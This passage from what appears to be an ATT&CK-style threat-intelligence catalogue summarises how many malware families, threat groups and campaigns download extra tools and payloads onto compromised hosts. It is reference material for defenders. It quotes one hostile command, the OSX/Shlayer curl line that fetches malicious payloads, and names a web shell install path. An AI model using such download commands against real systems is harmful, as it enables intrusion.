system.^[297][80]\n[298]S0651 [299]BoxCaon\n[300]BoxCaon can download files.^[301][81]\n[302]S0204 [303]Briba\n[304]Briba downloads files onto infected hosts.^[305][82]\n[306]G0060 [307]BRONZE BUTLER\n[308]BRONZE BUTLER has used various tools to download files, including\nDGet (a similar tool to wget).^[309][83]\n[310]S1063 [311]Brute Ratel C4\n[312]Brute Ratel C4 can download files to compromised hosts.^[313][84]\n[314]S0471 [315]build_downer\n[316]build_downer has the ability to download files from C2 to the\ninfected host.^[317][5]\n[318]S1039 [319]Bumblebee\n[320]Bumblebee can download and execute additional payloads including\nthrough the use of a Dex command.^[321][85]^[322][86]^[323][87]\n[324]S0482 [325]Bundlore\n[326]Bundlore can download and execute new versions of\nitself.^[327][88]\n[328]C0010 [329]C0010\nDuring [330]C0010, UNC3890 actors downloaded tools and malware onto a\ncompromised host.^[331][89]\n[332]C0015 [333]C0015\nDuring [334]C0015, the threat actors downloaded additional tools and\nfiles onto a compromised network.^[335][90]\n[336]C0017 [337]C0017\nDuring [338]C0017, [339]APT41 downloaded malicious payloads onto\ncompromised systems.^[340][91]\n[341]C0018 [342]C0018\nDuring [343]C0018, the threat actors downloaded additional tools, such\nas [344]Mimikatz and [345]Sliver, as well as [346]Cobalt Strike and\n[347]AvosLocker ransomware onto the victim network.^[348][92]^[349][93]\n[350]C0021 [351]C0021\nDuring [352]C0021, the threat actors downloaded additional tools and\nfiles onto victim machines.^[353][94]^[354][95]\n[355]C0026 [356]C0026\nDuring [357]C0026, the threat actors downloaded malicious payloads onto\nselect compromised hosts.^[358][15]\n[359]C0027 [360]C0027\nDuring [361]C0027, [362]Scattered Spider downloaded tools using victim\norganization systems.^[363][96]\n[364]S0274 [365]Calisto\n[366]Calisto has the capability to upload and download files to the\nvictim's machine.^[367][97]\n[368]S0077 [369]CallMe\n[370]CallMe has the capability to download a file to the victim from\nthe C2 server.^[371][98]\n[372]S0351 [373]Cannon\n[374]Cannon can download a payload for execution.^[375][99]\n[376]S0484 [377]Carberp\n[378]Carberp can download and execute new plugins from the C2 server.\n^[379][100]^[380][101]\n[381]S0348 [382]Cardinal RAT\n[383]Cardinal RAT can download and execute additional\npayloads.^[384][102]\n[385]S0465 [386]CARROTBALL\n[387]CARROTBALL has the ability to download and install a remote\npayload.^[388][103]\n[389]S0462 [390]CARROTBAT\n[391]CARROTBAT has the ability to download and execute a remote file\nvia [392]certutil.^[393][104]\n[394]S0572 [395]Caterpillar WebShell\n[396]Caterpillar WebShell has a module to download and upload files to\nthe system.^[397][105]\n[398]S0160 [399]certutil\n[400]certutil can be used to download files from a given\nURL.^[401][106]^[402][107]\n[403]S0631 [404]Chaes\n[405]Chaes can download additional files onto an infected\nmachine.^[406][108]\n[407]S0674 [408]CharmPower\n[409]CharmPower has the ability to download additional modules to a\ncompromised host.^[410][109]\n[411]S0144 [412]ChChes\n[413]ChChes is capable of downloading files, including additional\nmodules.^[414][110]^[415][111]^[416][112]\n[417]G0114 [418]Chimera\n[419]Chimera has remotely copied tools and malware onto targeted\nsystems.^[420][113]\n[421]S0020 [422]China Chopper\n[423]China Chopper's server component can download remote\nfiles.^[424][114]^[425][115]^[426][116]^[427][117]\n[428]S0023 [429]CHOPSTICK\n[430]CHOPSTICK is capable of performing remote file\ntransmission.^[431][118]\n[432]S0667 [433]Chrommme\n[434]Chrommme can download its code from C2.^[435][119]\n[436]S0054 [437]CloudDuke\n[438]CloudDuke downloads and executes additional malware from either a\nWeb address or a Microsoft OneDrive account.^[439][25]\n[440]S0106 [441]cmd\n[442]cmd can be used to copy files to\/from a remotely connected\nexternal system.^[443][120]\n[444]G0080 [445]Cobalt Group\n[446]Cobalt Group has used public sites such as github.com and\nsendspace.com to upload files and then download them to victim\ncomputers.^[447][121]^[448][2] The group's JavaScript backdoor is also\ncapable of downloading files.^[449][122]\n[450]S0154 [451]Cobalt Strike\n[452]Cobalt Strike can deliver additional payloads to victim\nmachines.^[453][123]^[454][124]\n[455]S0369 [456]CoinTicker\n[457]CoinTicker executes a Python script to download its second\nstage.^[458][125]\n[459]S0608 [460]Conficker\n[461]Conficker downloads an HTTP server to the infected\nmachine.^[462][126]\n[463]G0142 [464]Confucius\n[465]Confucius has downloaded additional files and payloads onto a\ncompromised host following initial access.^[466][127]^[467][128]\n[468]S0492 [469]CookieMiner\n[470]CookieMiner can download additional scripts from a web\nserver.^[471][129]\n[472]S0137 [473]CORESHELL\n[474]CORESHELL downloads another dropper from its C2 server.^[475][130]\n[476]S0614 [477]CostaBricks\n[478]CostaBricks has been used to load [479]SombRAT onto a compromised\nhost.^[480][131]\n[481]C0004 [482]CostaRicto\nDuring [483]CostaRicto, the threat actors downloaded malware and tools\nonto a compromised host.^[484][131]\n[485]S1023 [486]CreepyDrive\n[487]CreepyDrive can download files to the compromised host.^[488][132]\n[489]S0115 [490]Crimson\n[491]Crimson contains a command to retrieve files from its C2\nserver.^[492][133]^[493][134]^[494][135]\n[495]S0498 [496]Cryptoistic\n[497]Cryptoistic has the ability to send and receive files.^[498][136]\n[499]S0527 [500]CSPY Downloader\n[501]CSPY Downloader can download additional tools to a compromised\nhost.^[502][137]\n[503]S0625 [504]Cuba\n[505]Cuba can download files from its C2 server.^[506][138]\n[507]S0687 [508]Cyclops Blink\n[509]Cyclops Blink has the ability to download files to target\nsystems.^[510][139]^[511][140]\n[512]S0497 [513]Dacls\n[514]Dacls can download its payload from a C2\nserver.^[515][136]^[516][141]\n[517]S1014 [518]DanBot\n[519]DanBot can download additional files to a targeted\nsystem.^[520][142]\n[521]S0334 [522]DarkComet\n[523]DarkComet can load any files onto the infected machine to\nexecute.^[524][143]^[525][144]\n[526]G0012 [527]Darkhotel\n[528]Darkhotel has used first-stage payloads that download additional\nmalware from C2 servers.^[529][145]\n[530]S1066 [531]DarkTortilla\n[532]DarkTortilla can download additional packages for keylogging,\ncryptocurrency mining, and other capabilities; it can also retrieve\nmalicious payloads such as [533]Agent Tesla, AsyncRat, [534]NanoCore,\nRedLine, [535]Cobalt Strike, and Metasploit.^[536][146]\n[537]S0187 [538]Daserf\n[539]Daserf can download remote files.^[540][147]^[541][83]\n[542]S0255 [543]DDKONG\n[544]DDKONG downloads and uploads files on the victim\u2019s\nmachine.^[545][148]\n[546]S0616 [547]DEATHRANSOM\n[548]DEATHRANSOM can download files to a compromised host.^[549][149]\n[550]S0354 [551]Denis\n[552]Denis deploys additional backdoors and hacking tools to the\nsystem.^[553][150]\n[554]S0659 [555]Diavol\n[556]Diavol can receive configuration updates and additional payloads\nincluding wscpy.exe from C2.^[557][151]\n[558]S0200 [559]Dipsind\n[560]Dipsind can download remote files.^[561][152]\n[562]S1088 [563]Disco\n[564]Disco can download files to targeted systems via SMB.^[565][153]\n[566]S1021 [567]DnsSystem\n[568]DnsSystem can download files to compromised systems after\nreceiving a command with the string downloaddd.^[569][154]\n[570]S0213 [571]DOGCALL\n[572]DOGCALL can download and execute additional payloads.^[573][155]\n[574]S0600 [575]Doki\n[576]Doki has downloaded scripts from C2.^[577][156]\n[578]S0695 [579]Donut\n[580]Donut can download and execute previously staged shellcode\npayloads.^[581][157]\n[582]S0472 [583]down_new\n[584]down_new has the ability to download files to the compromised\nhost.^[585][5]\n[586]S0134 [587]Downdelph\nAfter downloading its main config file, [588]Downdelph downloads\nmultiple payloads from C2 servers.^[589][158]\n[590]G0035 [591]Dragonfly\n[592]Dragonfly has copied and installed tools for operations once in\nthe victim environment.^[593][159]\n[594]S0694 [595]DRATzarus\n[596]DRATzarus can deploy additional tools onto an infected\nmachine.^[597][160]\n[598]S0547 [599]DropBook\n[600]DropBook can download and execute additional\nfiles.^[601][161]^[602][162]\n[603]S0502 [604]Drovorub\n[605]Drovorub can download files to a compromised host.^[606][163]\n[607]S0567 [608]Dtrack\n[609]Dtrack\u2019s can download and upload a file to the victim\u2019s\ncomputer.^[610][164]^[611][165]\n[612]S0024 [613]Dyre\n[614]Dyre has a command to download and executes additional\nfiles.^[615][166]\n[616]S0624 [617]Ecipekac\n[618]Ecipekac can download additional payloads to a compromised\nhost.^[619][167]\n[620]S0554 [621]Egregor\n[622]Egregor has the ability to download files from its C2\nserver.^[623][168]^[624][169]\n[625]G0066 [626]Elderwood\nThe Ritsol backdoor trojan used by [627]Elderwood can download files\nonto a compromised host from a remote location.^[628][170]\n[629]S0081 [630]Elise\n[631]Elise can download additional files from the C2 server for\nexecution.^[632][171]\n[633]G1003 [634]Ember Bear\n[635]Ember Bear has used tools to download malicious code.^[636][172]\n[637]S0082 [638]Emissary\n[639]Emissary has the capability to download files from the C2\nserver.^[640][173]\n[641]S0363 [642]Empire\n[643]Empire can upload and download to and from a victim\nmachine.^[644][174]\n[645]S0404 [646]esentutl\n[647]esentutl can be used to copy files from a given URL.^[648][175]\n[649]S0396 [650]EvilBunny\n[651]EvilBunny has downloaded additional Lua scripts from the\nC2.^[652][176]\n[653]S0568 [654]EVILNUM\n[655]EVILNUM can download and upload files to the victim's\ncomputer.^[656][177]^[657][178]\n[658]G0120 [659]Evilnum\n[660]Evilnum can deploy additional components or tools as\nneeded.^[661][177]\n[662]S0401 [663]Exaramel for Linux\n[664]Exaramel for Linux has a command to download a file from and to a\nremote C2 server.^[665][179]^[666][180]\n[667]S0569 [668]Explosive\n[669]Explosive has a function to download a file to the infected\nsystem.^[670][181]\n[671]S0171 [672]Felismus\n[673]Felismus can download files from remote servers.^[674][182]\n[675]S0267 [676]FELIXROOT\n[677]FELIXROOT downloads and uploads files to and from the victim\u2019s\nmachine.^[678][183]^[679][184]\n[680]G1016 [681]FIN13\n[682]FIN13 has downloaded additional tools and malware to compromised\nsystems.^[683][185]^[684][186]\n[685]G0046 [686]FIN7\n[687]FIN7 has downloaded additional malware to execute on the victim's\nmachine, including by using a PowerShell script to launch shellcode\nthat retrieves an additional payload.^[688][187]^[689][188]^[690][189]\n[691]G0061 [692]FIN8\n[693]FIN8 has used remote code execution to download subsequent\npayloads.^[694][190]^[695][191]\n[696]S0696 [697]Flagpro\n[698]Flagpro can download additional malware from the C2\nserver.^[699][192]\n[700]S0381 [701]FlawedAmmyy\n[702]FlawedAmmyy can transfer files from C2.^[703][193]\n[704]S0661 [705]FoggyWeb\n[706]FoggyWeb can receive additional malicious components from an actor\ncontrolled C2 server and execute them on a compromised AD FS\nserver.^[707][194]\n[708]G0117 [709]Fox Kitten\n[710]Fox Kitten has downloaded additional tools including [711]PsExec\ndirectly to endpoints.^[712][195]\n[713]C0001 [714]Frankenstein\nDuring [715]Frankenstein, the threat actors downloaded files and tools\nonto a victim machine.^[716][196]\n[717]S0095 [718]ftp\n[719]ftp may be abused by adversaries to transfer tools or files from\nan external system into a compromised\nenvironment.^[720][197]^[721][198]\n[722]S1044 [723]FunnyDream\n[724]FunnyDream can download additional files onto a compromised\nhost.^[725][199]\n[726]C0007 [727]FunnyDream\nDuring [728]FunnyDream, the threat actors downloaded additional\ndroppers and backdoors onto a compromised system.^[729][199]\n[730]S0628 [731]FYAnti\n[732]FYAnti can download additional payloads to a compromised\nhost.^[733][167]\n[734]G0093 [735]GALLIUM\n[736]GALLIUM dropped additional tools to victims during their\noperation, including portqry.exe, a renamed cmd.exe file, winrar, and\n[737]HTRAN.^[738][200]^[739][76]\n[740]G0047 [741]Gamaredon Group\n[742]Gamaredon Group has downloaded additional malware and tools onto a\ncompromised host.^[743][201]^[744][202]^[745][203]^[746][204]\n[747]S0168 [748]Gazer\n[749]Gazer can execute a task to download a file.^[750][205]^[751][206]\n[752]S0666 [753]Gelsemium\n[754]Gelsemium can download additional plug-ins to a compromised\nhost.^[755][119]\n[756]S0032 [757]gh0st RAT\n[758]gh0st RAT can download files to the victim\u2019s\nmachine.^[759][207]^[760][208]\n[761]S0249 [762]Gold Dragon\n[763]Gold Dragon can download additional components from the C2\nserver.^[764][209]\n[765]S0493 [766]GoldenSpy\n[767]GoldenSpy constantly attempts to download and execute files from\nthe remote C2, including [768]GoldenSpy itself if not found on the\nsystem.^[769][210]\n[770]S0588 [771]GoldMax\n[772]GoldMax can download and execute additional\nfiles.^[773][211]^[774][212]\n[775]G0078 [776]Gorgon Group\n[777]Gorgon Group malware can download additional files from C2\nservers.^[778][213]\n[779]S0531 [780]Grandoreiro\n[781]Grandoreiro can download its second stage from a hardcoded URL\nwithin the loader's code.^[782][214]^[783][215]\n[784]S0342 [785]GreyEnergy\n[786]GreyEnergy can download additional modules and\npayloads.^[787][184]\n[788]S0632 [789]GrimAgent\n[790]GrimAgent has the ability to download and execute additional\npayloads.^[791][216]\n[792]S0561 [793]GuLoader\n[794]GuLoader can download further malware for execution on the\nvictim's machine.^[795][217]\n[796]S0132 [797]H1N1\n[798]H1N1 contains a command to download and execute a file from a\nremotely hosted URL using WinINet HTTP requests.^[799][218]\n[800]G0125 [801]HAFNIUM\n[802]HAFNIUM has downloaded malware and tools--including Nishang and\nPowerCat--onto a compromised host.^[803][219]^[804][117]\n[805]S0499 [806]Hancitor\n[807]Hancitor has the ability to download additional files from\nC2.^[808][220]\n[809]S0214 [810]HAPPYWORK\ncan download and execute a second-stage payload.^[811][31]\n[812]S0170 [813]Helminth\n[814]Helminth can download additional files.^[815][221]\n[816]G1001 [817]HEXANE\n[818]HEXANE has downloaded additional payloads and malicious scripts\nonto a compromised host.^[819][222]\n[820]S0087 [821]Hi-Zor\n[822]Hi-Zor has the ability to upload and download files from its C2\nserver.^[823][223]\n[824]S0394 [825]HiddenWasp\n[826]HiddenWasp downloads a tar compressed archive from a download\nserver to the system.^[827][224]\n[828]S0009 [829]Hikit\n[830]Hikit has the ability to download files to a compromised\nhost.^[831][225]\n[832]S0601 [833]Hildegard\n[834]Hildegard has downloaded additional scripts that build and run\nMonero cryptocurrency miners.^[835][226]\n[836]S0376 [837]HOPLIGHT\n[838]HOPLIGHT has the ability to connect to a remote host in order to\nupload and download files.^[839][227]\n[840]S0431 [841]HotCroissant\n[842]HotCroissant has the ability to upload a file from the command and\ncontrol (C2) server to the victim machine.^[843][228]\n[844]S0070 [845]HTTPBrowser\n[846]HTTPBrowser is capable of writing a file to the compromised system\nfrom the C2 server.^[847][229]\n[848]S0203 [849]Hydraq\n[850]Hydraq creates a backdoor through which remote attackers can\ndownload files and additional malware components.^[851][230]^[852][231]\n[853]S0398 [854]HyperBro\n[855]HyperBro has the ability to download additional files.^[856][232]\n[857]S0483 [858]IcedID\n[859]IcedID has the ability to download additional modules and a\nconfiguration file from C2.^[860][233]^[861][234]\n[862]G0136 [863]IndigoZebra\n[864]IndigoZebra has downloaded additional files and tools from its C2\nserver.^[865][81]\n[866]G0119 [867]Indrik Spider\n[868]Indrik Spider has downloaded additional scripts, malware, and\ntools onto a compromised host.^[869][235]^[870][236]\n[871]S0604 [872]Industroyer\n[873]Industroyer downloads a shellcode payload from a remote C2 server\nand loads it into memory.^[874][237]\n[875]S0260 [876]InvisiMole\n[877]InvisiMole can upload files to the victim's machine for\noperations.^[878][238]^[879][239]\n[880]S0015 [881]Ixeshe\n[882]Ixeshe can download and execute additional files.^[883][240]\n[884]S0528 [885]Javali\n[886]Javali can download payloads from remote C2 servers.^[887][45]\n[888]S0044 [889]JHUHUGIT\n[890]JHUHUGIT can retrieve an additional payload from its C2\nserver.^[891][241]^[892][242] [893]JHUHUGIT has a command to download\nfiles to the victim\u2019s machine.^[894][243]\n[895]S0201 [896]JPIN\n[897]JPIN can download files and upgrade itself.^[898][152]\n[899]S0283 [900]jRAT\n[901]jRAT can download and execute\nfiles.^[902][244]^[903][245]^[904][246]\n[905]S0648 [906]JSS Loader\n[907]JSS Loader has the ability to download malicious executables to a\ncompromised host.^[908][247]\n[909]S0215 [910]KARAE\n[911]KARAE can upload and download files, including second-stage\nmalware.^[912][31]\n[913]S0088 [914]Kasidet\n[915]Kasidet has the ability to download and execute additional\nfiles.^[916][248]\n[917]S0265 [918]Kazuar\n[919]Kazuar downloads additional plug-ins to load on the victim\u2019s\nmachine, including the ability to upgrade and replace its own\nbinary.^[920][249]\n[921]G0004 [922]Ke3chang\n[923]Ke3chang has used tools to download files to compromised\nmachines.^[924][250]\n[925]S0585 [926]Kerrdown\n[927]Kerrdown can download specific payloads to a compromised host\nbased on OS architecture.^[928][251]\n[929]S0487 [930]Kessel\n[931]Kessel can download additional modules from the C2\nserver.^[932][78]\n[933]S1020 [934]Kevin\n[935]Kevin can download files to the compromised host.^[936][222]\n[937]S0387 [938]KeyBoy\n[939]KeyBoy has a download and upload\nfunctionality.^[940][252]^[941][253]\n[942]S0271 [943]KEYMARBLE\n[944]KEYMARBLE can upload files to the victim\u2019s machine and can\ndownload additional payloads.^[945][254]\n[946]S0526 [947]KGH_SPY\n[948]KGH_SPY has the ability to download and execute code from remote\nservers.^[949][137]\n[950]G0094 [951]Kimsuky\n[952]Kimsuky has downloaded additional scripts, tools, and malware onto\nvictim systems.^[953][39]^[954][255]\n[955]S0599 [956]Kinsing\n[957]Kinsing has downloaded additional lateral movement scripts from\nC2.^[958][256]\n[959]S0437 [960]Kivars\n[961]Kivars has the ability to download and execute files.^[962][257]\n[963]S0250 [964]Koadic\n[965]Koadic can download additional files and\ntools.^[966][258]^[967][259]\n[968]S0669 [969]KOCTOPUS\n[970]KOCTOPUS has executed a PowerShell command to download a file to\nthe system.^[971][259]\n[972]S0356 [973]KONNI\n[974]KONNI can download files and execute them on the victim\u2019s\nmachine.^[975][260]^[976][261]\n[977]S0236 [978]Kwampirs\n[979]Kwampirs downloads additional files from C2 servers.^[980][262]\n[981]G0032 [982]Lazarus Group\n[983]Lazarus Group has downloaded files, malware, and tools from its C2\nonto a compromised\nhost.^[984][263]^[985][264]^[986][265]^[987][136]^[988][141]^[989][266]\n^[990][267]^[991][268]^[992][269]^[993][270]\n[994]G0140 [995]LazyScripter\n[996]LazyScripter had downloaded additional tools to a compromised\nhost.^[997][259]\n[998]G0065 [999]Leviathan\n[1000]Leviathan has downloaded additional scripts and files from\nadversary-controlled servers.^[1001][271]^[1002][114]\n[1003]S0395 [1004]LightNeuron\n[1005]LightNeuron has the ability to download and execute additional\nfiles.^[1006][272]\n[1007]S0211 [1008]Linfo\n[1009]Linfo creates a backdoor through which remote attackers can\ndownload files onto compromised hosts.^[1010][273]\n[1011]S0513 [1012]LiteDuke\n[1013]LiteDuke has the ability to download files.^[1014][274]\n[1015]S0680 [1016]LitePower\n[1017]LitePower has the ability to download payloads containing system\ncommands to a compromised host.^[1018][275]\n[1019]S0681 [1020]Lizar\n[1021]Lizar can download additional plugins, files, and\ntools.^[1022][276]\n[1023]S0447 [1024]Lokibot\n[1025]Lokibot downloaded several staged items onto the victim's\nmachine.^[1026][277]\n[1027]S0451 [1028]LoudMiner\n[1029]LoudMiner used SCP to update the miner from the C2.^[1030][278]\n[1031]S0042 [1032]LOWBALL\n[1033]LOWBALL uses the Dropbox API to request two files, one of which\nis the same file as the one dropped by the malicious email attachment.\nThis is most likely meant to be a mechanism to update the compromised\nhost with a new version of the [1034]LOWBALL malware.^[1035][279]\n[1036]S0532 [1037]Lucifer\n[1038]Lucifer can download and execute a replica of itself using\n[1039]certutil.^[1040][280]\n[1041]G1014 [1042]LuminousMoth\n[1043]LuminousMoth has downloaded additional malware and tools onto a\ncompromised host.^[1044][281]^[1045][282]\n[1046]S0409 [1047]Machete\n[1048]Machete can download additional files for execution on the\nvictim\u2019s machine.^[1049][283]\n[1050]S1016 [1051]MacMa\n[1052]MacMa has downloaded additional files, including an exploit for\nused privilege escalation.^[1053][284]^[1054][285]\n[1055]S1048 [1056]macOS.OSAMiner\n[1057]macOS.OSAMiner has used curl to download a [1058]Stripped\nPayloads from a public facing adversary-controlled webpage.\n[1059]S1060 [1060]Mafalda\n[1061]Mafalda can download additional files onto the compromised\nhost.^[1062][286]\n[1063]G0059 [1064]Magic Hound\n[1065]Magic Hound has downloaded additional code and files from servers\nonto victims.^[1066][287]^[1067][288]^[1068][289]^[1069][290]\n[1070]S0652 [1071]MarkiRAT\n[1072]MarkiRAT can download additional files and tools from its C2\nserver, including through the use of [1073]BITSAdmin.^[1074][291]\n[1075]S0500 [1076]MCMD\n[1077]MCMD can upload additional files to a compromised\nhost.^[1078][292]\n[1079]S0459 [1080]MechaFlounder\n[1081]MechaFlounder has the ability to upload and download files to and\nfrom a compromised host.^[1082][293]\n[1083]S0530 [1084]Melcoz\n[1085]Melcoz has the ability to download additional files to a\ncompromised host.^[1086][45]\n[1087]G0045 [1088]menuPass\n[1089]menuPass has installed updates and new malware on\nvictims.^[1090][294]^[1091][295]\n[1092]G1013 [1093]Metador\n[1094]Metador has downloaded tools and malware onto a compromised\nsystem.^[1095][296]\n[1096]S1059 [1097]metaMain\n[1098]metaMain can download files onto compromised\nsystems.^[1099][296]^[1100][286]\n[1101]S0455 [1102]Metamorfo\n[1103]Metamorfo has used MSI files to download additional files to\nexecute.^[1104][297]^[1105][298]^[1106][299]^[1107][300]\n[1108]S0688 [1109]Meteor\n[1110]Meteor has the ability to download additional files for execution\non the victim's machine.^[1111][301]\n[1112]S0339 [1113]Micropsia\n[1114]Micropsia can download and execute an executable from the C2\nserver.^[1115][302]^[1116][303]\n[1117]S1015 [1118]Milan\n[1119]Milan has received files from C2 and stored them in log folders\nbeginning with the character sequence a9850d2f.^[1120][304]\n[1121]S0051 [1122]MiniDuke\n[1123]MiniDuke can download additional encrypted backdoors onto the\nvictim via GIF files.^[1124][305]^[1125][274]\n[1126]S0084 [1127]Mis-Type\n[1128]Mis-Type has downloaded additional malware and files onto a\ncompromised host.^[1129][306]\n[1130]S0083 [1131]Misdat\n[1132]Misdat is capable of downloading files from the C2.^[1133][306]\n[1134]S0080 [1135]Mivast\n[1136]Mivast has the capability to download and execute .exe\nfiles.^[1137][307]\n[1138]S0079 [1139]MobileOrder\n[1140]MobileOrder has a command to download a file from the C2 server\nto the victim mobile device's SD card.^[1141][98]\n[1142]S0553 [1143]MoleNet\n[1144]MoleNet can download additional payloads from the C2.^[1145][161]\n[1146]G0021 [1147]Molerats\n[1148]Molerats used executables to download malicious files from\ndifferent sources.^[1149][308]^[1150][309]\n[1151]S1026 [1152]Mongall\n[1153]Mongall can download files to targeted systems.^[1154][310]\n[1155]S0284 [1156]More_eggs\n[1157]More_eggs can download and launch additional\npayloads.^[1158][311]^[1159][312]\n[1160]G1009 [1161]Moses Staff\n[1162]Moses Staff has downloaded and installed web shells to following\npath\nC:\\inetpub\\wwwroot\\aspnet_client\\system_web\\IISpool.aspx.^[1163][313]\n[1164]S0256 [1165]Mosquito\n[1166]Mosquito can upload and download files to the victim.^[1167][314]\n[1168]G0069 [1169]MuddyWater\n[1170]MuddyWater has used malware that can upload additional files to\nthe victim\u2019s machine.^[1171][315]^[1172][316]^[1173][317]^[1174][318]\n[1175]G0129 [1176]Mustang Panda\n[1177]Mustang Panda has downloaded additional executables following the\ninitial infection stage.^[1178][319]\n[1179]S0228 [1180]NanHaiShu\n[1181]NanHaiShu can download additional files from URLs.^[1182][271]\n[1183]S0336 [1184]NanoCore\n[1185]NanoCore has the capability to download and activate additional\nmodules for execution.^[1186][320]^[1187][321]\n[1188]S0247 [1189]NavRAT\n[1190]NavRAT can download files remotely.^[1191][322]\n[1192]S0272 [1193]NDiskMonitor\n[1194]NDiskMonitor can download and execute a file from given\nURL.^[1195][60]\n[1196]S0630 [1197]Nebulae\n[1198]Nebulae can download files from C2.^[1199][323]\n[1200]S0691 [1201]Neoichor\n[1202]Neoichor can download additional files onto a compromised\nhost.^[1203][250]\n[1204]S0210 [1205]Nerex\n[1206]Nerex creates a backdoor through which remote attackers can\ndownload files onto a compromised host.^[1207][170]\n[1208]S0457 [1209]Netwalker\nOperators deploying [1210]Netwalker have used psexec and certutil to\nretrieve the [1211]Netwalker payload.^[1212][324]\n[1213]S0198 [1214]NETWIRE\n[1215]NETWIRE can downloaded payloads from C2 to the compromised\nhost.^[1216][325]^[1217][326]\n[1218]S0118 [1219]Nidiran\n[1220]Nidiran can download and execute files.^[1221][327]\n[1222]C0002 [1223]Night Dragon\nDuring [1224]Night Dragon, threat actors used administrative utilities\nto deliver Trojan components to remote systems.^[1225][328]\n[1226]S1090 [1227]NightClub\n[1228]NightClub can load multiple additional plugins on an infected\nhost.^[1229][153]\n[1230]S0385 [1231]njRAT\n[1232]njRAT can download files to the victim\u2019s\nmachine.^[1233][329]^[1234][330]\n[1235]S0353 [1236]NOKKI\n[1237]NOKKI has downloaded a remote module for execution.^[1238][331]\n[1239]G0133 [1240]Nomadic Octopus\n[1241]Nomadic Octopus has used malicious macros to download additional\nfiles to the victim's machine.^[1242][332]\n[1243]S0340 [1244]Octopus\n[1245]Octopus can download additional files and tools onto the victim\u2019s\nmachine.^[1246][333]^[1247][334]^[1248][332]\n[1249]G0049 [1250]OilRig\n[1251]OilRig can download remote files onto victims.^[1252][335]\n[1253]S0439 [1254]Okrum\n[1255]Okrum has built-in commands for uploading, downloading, and\nexecuting files to the system.^[1256][336]\n[1257]S0264 [1258]OopsIE\n[1259]OopsIE can download files from its C2 server to the victim's\nmachine.^[1260][337]^[1261][338]\n[1262]C0022 [1263]Operation Dream Job\nDuring [1264]Operation Dream Job, [1265]Lazarus Group downloaded\nmultistage malware and tools onto a compromised\nhost.^[1266][160]^[1267][339]^[1268][340]\n[1269]C0006 [1270]Operation Honeybee\nDuring [1271]Operation Honeybee, the threat actors downloaded\nadditional malware and malicious scripts onto a compromised\nhost.^[1272][341]\n[1273]C0013 [1274]Operation Sharpshooter\nDuring [1275]Operation Sharpshooter, additional payloads were\ndownloaded after a target was infected with a first-stage\ndownloader.^[1276][342]\n[1277]C0014 [1278]Operation Wocao\nDuring [1279]Operation Wocao, threat actors downloaded additional files\nto the infected system.^[1280][343]\n[1281]S0229 [1282]Orz\n[1283]Orz can download files onto the victim.^[1284][271]\n[1285]S0402 [1286]OSX\/Shlayer\n[1287]OSX\/Shlayer can download payloads, and extract bytes from files.\n[1288]OSX\/Shlayer uses the curl -fsL \"$url\" >$tmp_path command to\ndownload malicious payloads into a temporary\ndirectory.^[1289][344]^[1290][345]^[1291][346]^[1292][347]\n[1293]S0352 [1294]OSX_OCEANLOTUS.D\n[1295]OSX_OCEANLOTUS.D has a command to download and execute a file on\nthe victim\u2019s machine.^[1296][348]^[1297][349]\n[1298]S1017 [1299]OutSteel\n[1300]OutSteel can download files from its C2 server.^[1301][172]\n[1302]S0598 [1303]P.A.S. Webshell\n[1304]P.A.S. Webshell can upload and download files to and from\ncompromised hosts.^[1305][180]\n[1306]S0626 [1307]P8RAT\n[1308]P8RAT can download additional payloads to a target\nsystem.^[1309][167]\n[1310]S0664 [1311]Pandora\n[1312]Pandora can load additional drivers and files onto a victim\nmachine.^[1313][350]\n[1314]S0208 [1315]Pasam\n[1316]Pasam creates a backdoor through which remote attackers can\nupload files.^[1317][351]\n[1318]G0040 [1319]Patchwork\n[1320]Patchwork payloads download additional files from the C2\nserver.^[1321][352]^[1322][60]\n[1323]S0587 [1324]Penquin\n[1325]Penquin can execute the command code do_download to retrieve\nremote files from C2.^[1326][353]\n[1327]S0643 [1328]Peppy\n[1329]Peppy can download and execute remote files.^[1330][133]\n[1331]S0501 [1332]PipeMon\n[1333]PipeMon can install additional modules via C2\ncommands.^[1334][354]\n[1335]S0124 [1336]Pisloader\n[1337]Pisloader has a command to upload a file to the victim\nmachine.^[1338][355]\n[1339]S0254 [1340]PLAINTEE\n[1341]PLAINTEE has downloaded and executed additional\nplugins.^[1342][148]\n[1343]G0068 [1344]PLATINUM\n[1345]PLATINUM has transferred files using the Intel\u00ae Active Management\nTechnology (AMT) Serial-over-LAN (SOL) channel.^[1346][356]\n[1347]S0435 [1348]PLEAD\n[1349]PLEAD has the ability to upload and download files to and from an\ninfected host.^[1350][357]\n[1351]S0013 [1352]PlugX\n[1353]PlugX has a module to download and execute files on the\ncompromised machine.^[1354][358]^[1355][359]\n[1356]S0428 [1357]PoetRAT\n[1358]PoetRAT has the ability to copy files and download\/upload files\ninto C2 channels using FTP and HTTPS.^[1359][360]^[1360][361]\n[1361]S0012 [1362]PoisonIvy\n[1363]PoisonIvy creates a backdoor through which remote attackers can\nupload files.^[1364][362]\n[1365]S0518 [1366]PolyglotDuke\n[1367]PolyglotDuke can retrieve payloads from the C2\nserver.^[1368][274]\n[1369]S0453 [1370]Pony\n[1371]Pony can download additional files onto the infected\nsystem.^[1372][363]\n[1373]S0150 [1374]POSHSPY\n[1375]POSHSPY downloads and executes additional PowerShell code and\nWindows binaries.^[1376][364]\n[1377]S0139 [1378]PowerDuke\n[1379]PowerDuke has a command to download a file.^[1380][365]\n[1381]S1012 [1382]PowerLess\n[1383]PowerLess can download additional payloads to a compromised\nhost.^[1384][366]\n[1385]S0685 [1386]PowerPunch\n[1387]PowerPunch can download payloads from adversary\ninfrastructure.^[1388][204]\n[1389]S0145 [1390]POWERSOURCE\n[1391]POWERSOURCE has been observed being used to download\n[1392]TEXTMATE and the Cobalt Strike Beacon payload onto\nvictims.^[1393][367]\n[1394]S0223 [1395]POWERSTATS\n[1396]POWERSTATS can retrieve and execute additional [1397]PowerShell\npayloads from the C2 server.^[1398][368]\n[1399]S0184 [1400]POWRUNER\n[1401]POWRUNER can download or upload files from its C2\nserver.^[1402][335]\n[1403]S0613 [1404]PS1\n[1405]CostaBricks can download additional payloads onto a compromised\nhost.^[1406][131]\n[1407]S0078 [1408]Psylo\n[1409]Psylo has a command to download a file to the system from its C2\nserver.^[1410][98]\n[1411]S0147 [1412]Pteranodon\n[1413]Pteranodon can download and execute additional\nfiles.^[1414][201]^[1415][369]^[1416][370]\n[1417]S0196 [1418]PUNCHBUGGY\n[1419]PUNCHBUGGY can download additional files and payloads to\ncompromised hosts.^[1420][371]^[1421][372]\n[1422]S0192 [1423]Pupy\n[1424]Pupy can upload and download 